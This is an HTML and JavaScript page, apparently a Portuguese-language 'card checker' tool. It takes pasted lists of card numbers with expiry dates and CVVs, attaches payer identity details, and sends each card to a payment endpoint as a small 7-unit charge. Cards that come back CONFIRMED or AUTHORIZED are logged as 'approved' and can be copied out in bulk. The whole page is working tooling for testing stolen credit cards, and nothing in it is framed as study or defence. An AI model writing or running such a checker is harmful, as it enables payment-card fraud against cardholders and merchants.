<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checker Raridade</title>

  <style>
    body {
      background:#013b4d;
      color:#fff;
      font-family:Arial,sans-serif;
      text-align:center;
      padding:20px;
      margin:0;
    }

    h1 { color:rgb(147, 188, 196); }

    .box {
      max-width:600px;
      margin:0 auto 20px;
      background:#022b3a;
      padding:20px;
      border-radius:8px;
    }

    input, textarea {
      width:100%;
      padding:10px;
      margin:8px 0;
      border-radius:5px;
      border:none;
      font-size:14px;
    }

    textarea {
      background:#222;
      color:#0f0;
      height:120px;
    }

    button {
      padding:10px 20px;
      font-weight:bold;
      border:none;
      border-radius:5px;
      cursor:pointer;
      margin-top:10px;
    }

    .start { background:#0f0; color:#000; }
    .pause { background:#f00; color:#fff; }
    .copy { background:#1da1f2; color:#fff; }

    .hidden { display:none; }

    .status span { display:block; margin:4px 0; }

    .result-box {
      background:#111;
      padding:10px;
      border-radius:5px;
      max-height:220px;
      overflow-y:auto;
      text-align:left;
      font-size:13px;
    }

    .approved { color:#0f0; cursor:pointer; }
    .rejected { color:#f55; }
  </style>
</head>
<body>

<h1>Checker Raridade</h1>

<!-- ETAPA 1 -->
<div class="box" id="pagadorBox">
  <h3>Dados do Pagador</h3>
  <input id="nome" placeholder="Nome completo">
  <input id="cpfCnpj" placeholder="CPF">
  <input id="email" placeholder="Email">
  <input id="telefone" placeholder="Telefone">
  <button class="start" onclick="salvarPagador()">Continuar</button>
</div>

<!-- ETAPA 2 -->
<div class="box hidden" id="checkerBox">

  <textarea id="inputData" placeholder="4111111111111111 | 12 | 25 | 123"></textarea>

  <button class="start" onclick="startChecker()">INICIAR</button>
  <button class="pause" onclick="pauseChecker()">PAUSAR</button>
  <button class="copy" onclick="copiarAprovadas()">COPIAR APROVADAS</button>

  <div class="status">
    <span>Status: <strong id="status">Aguardando</strong></span>
    <span>Carregadas: <strong id="loaded">0</strong></span>
    <span>Testadas: <strong id="tested">0</strong></span>
    <span>Aprovadas: <strong id="approved">0</strong></span>
    <span>Reprovadas: <strong id="rejected">0</strong></span>
  </div>

  <h4>✅ Aprovadas</h4>
  <div class="result-box" id="approvedBox"></div>

  <h4>❌ Reprovadas</h4>
  <div class="result-box" id="rejectedBox"></div>
</div>

<script>
/* PAGADOR */
function salvarPagador() {
  const pagador = {
    nome: nome.value,
    cpfCnpj: cpfCnpj.value,
    email: email.value,
    telefone: telefone.value
  };

  if (Object.values(pagador).some(v => !v)) {
    alert("Preencha todos os dados");
    return;
  }

  sessionStorage.setItem("pagador", JSON.stringify(pagador));
  pagadorBox.classList.add("hidden");
  checkerBox.classList.remove("hidden");
}

/* CHECKER */
let isRunning = false;
let index = 0;
let entries = [];
let aprovadas = [];

function startChecker() {
  if (isRunning) return;
  isRunning = true;

  entries = inputData.value.trim().split("\n").filter(l => l);
  loaded.textContent = entries.length;
  index = 0;
  status.textContent = "Testando...";
  testNext();
}

function pauseChecker() {
  isRunning = false;
  status.textContent = "Pausado";
}

async function testNext() {
  if (!isRunning || index >= entries.length) {
    status.textContent = "Finalizado";
    return;
  }

  const pagador = JSON.parse(sessionStorage.getItem("pagador"));
  const [card, mm, yy, cvv] = entries[index].split("|").map(v => v.trim());

  try {
    const res = await fetch("/api/cards", {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({
        card_number: card,
        expiration_month: mm,
        expiration_year: yy,
        security_code: cvv,
        cardholder: { name: pagador.nome },
        email: pagador.email,
        cpfCnpj: pagador.cpfCnpj,
        telefone: pagador.telefone,
        amount: 7,
        creditCardHolderInfo: {
          name: pagador.nome,
          email: pagador.email,
          cpfCnpj: pagador.cpfCnpj,
          phone: pagador.telefone,
          postalCode: "01001000",
          addressNumber: "123"
        }
      })
    });

    const data = await res.json();
    tested.textContent = index + 1;

    if (data.status === "CONFIRMED" || data.status === "AUTHORIZED") {
      const linha = `${card} | ${mm}/${yy} | ${cvv}`;
      aprovadas.push(linha);
      approved.textContent = aprovadas.length;
      approvedBox.innerHTML += `<div class="approved" onclick="copiar('${linha}')">✅ ${linha}</div>`;
    } else {
      rejected.textContent++;
      rejectedBox.innerHTML += `<div class="rejected">❌ ${card.slice(0,6)}**** | ${data.details?.errors?.[0]?.description || 'Reprovado'}</div>`;
    }

  } catch {
    rejected.textContent++;
    rejectedBox.innerHTML += `<div class="rejected">❌ ${card.slice(0,6)}**** | Erro de conexão</div>`;
  }

  index++;
  setTimeout(testNext, 800);
}

/* COPIAR */
function copiar(texto) {
  navigator.clipboard.writeText(texto);
  alert("Copiado!");
}

function copiarAprovadas() {
  navigator.clipboard.writeText(aprovadas.join("\n"));
  alert("Aprovadas copiadas!");
}
</script>

</body>
</html>
